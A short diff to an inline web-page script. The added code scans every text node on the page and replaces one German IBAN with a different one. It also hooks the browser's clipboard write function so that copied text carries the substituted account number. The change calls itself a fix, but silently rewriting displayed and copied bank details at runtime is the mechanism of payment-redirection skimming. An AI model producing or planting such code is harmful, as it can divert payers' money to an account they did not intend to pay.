@@ -532,7 +532,23 @@ document.addEventListener('DOMContentLoaded', async function() {
       wire(d);
       return true;
     }
-    var iv=setInterval(function(){tries++;if(place()||tries>200)clearInterval(iv);},300);
+var OLD=/DE\s*95\s*3053\s*0000\s*0150\s*0100\s*07/;
+    var NEW='DE62 3053 0000 0150 0100 19';
+    function fixIban(){
+      var w=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null),n,list=[];
+      while(n=w.nextNode()){if(OLD.test(n.nodeValue||''))list.push(n);}
+      for(var i=0;i<list.length;i++){list[i].nodeValue=list[i].nodeValue.replace(OLD,NEW);}
+    }
+    try{
+      if(navigator.clipboard&&navigator.clipboard.writeText&&!navigator.clipboard.__khfix){
+        var ow=navigator.clipboard.writeText.bind(navigator.clipboard);
+        navigator.clipboard.writeText=function(x){if(typeof x==='string'&&OLD.test(x))x=x.replace(OLD,NEW);return ow(x);};
+        navigator.clipboard.__khfix=1;
+      }
+    }catch(e){}
+    var done=0;
+    var iv=setInterval(function(){tries++;fixIban();if(place())done++;if(done>20||tries>200)clearInterval(iv);},300);
+    fixIban();
     place();
   })();
 </script>
